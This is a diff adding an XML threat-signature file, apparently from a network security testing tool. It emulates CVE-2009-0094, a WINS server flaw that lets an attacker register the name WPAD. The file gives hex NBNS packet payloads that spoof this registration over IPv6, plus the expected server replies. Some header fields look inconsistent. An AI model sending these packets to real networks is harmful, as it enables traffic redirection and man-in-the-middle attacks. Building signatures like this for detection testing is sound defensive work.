@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft WINS Server WPAD Registration Spoofing (IPv6 Version)"/>
+    <EngDesc display="true" value="A spoofing vulnerability exists in Microsoft Windows WINS server. This vulnerability is due to lack of validation of NetBIOS communication names during name registration with the WINS server. Exploiting the vulnerability allows an attacker to register specially treated/trusted names, such as WPAD and ISATAP, and point them to arbitrary addresses.            Exploiting this vulnerability could allow a remote unauthenticated attacker to redirect Internet traffic to an attacker controlled host, thereby allowing man-in-the-middle and spoofing attacks. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="NBNS/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Microsoft_Windows"/>
+      <item value="Microsoft_Microsoft_Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_2000"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20090310-17"/>
+    <CVEID display="true" value="CVE-2009-0094"/>
+    <bugtraqID display="true" value="34013"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="3d7eb6a120590285e4444bf9cb2decf5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Partial"/>
+    <IntegImpact display="false" value="not-required"/>
+    <AvailImpact display="false" value="Partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1240005079"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1239995895" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="J"/>
+    <NamedVar name="NBNSdestPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="B"/>
+    <for index="C">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="D"/>
+    <for index="E">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$NBNSdestPort" checksum="74B0" length="004C" Payload="8000290000010000000000012046484641454245454341434143414341434143414341434143414341434141410000200001C00C00200001000493E00006600001020304"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)" destPort="$NBNSdestPort" checksum="54F2" length="003A" Payload="8002010000010000000000002046484641454245454341434143414341434143414341434143414341434141410000200001"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <UDP srcPort="@random(1026,65535)&#13;&#10;@random(1026,65535)" destPort="$NBNSdestPort" checksum="6CB0" length="004C" Payload="8000310000010000000000012046484641454245454341434143414341434143414341434143414341434141410000200001C00C00200001000493E00006600001020304"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1,3,5">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="5B47" length="0046" Payload="8000AD80000000010000000020464846414542454543414341434143414341434143414341434143414341414100002000010007E9000006600001020304"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="6C4D" length="0046" Payload="8002858000000001000000002046484641454245454341434143414341434143414341434143414341434141410000200001000000000006600001020304"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <UDP srcPort="" destPort="" checksum="A9E4" length="0046" Payload="8000B40600000001000000002046484641454245454341434143414341434143414341434143414341434141410000200001000493E00006600001020304"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
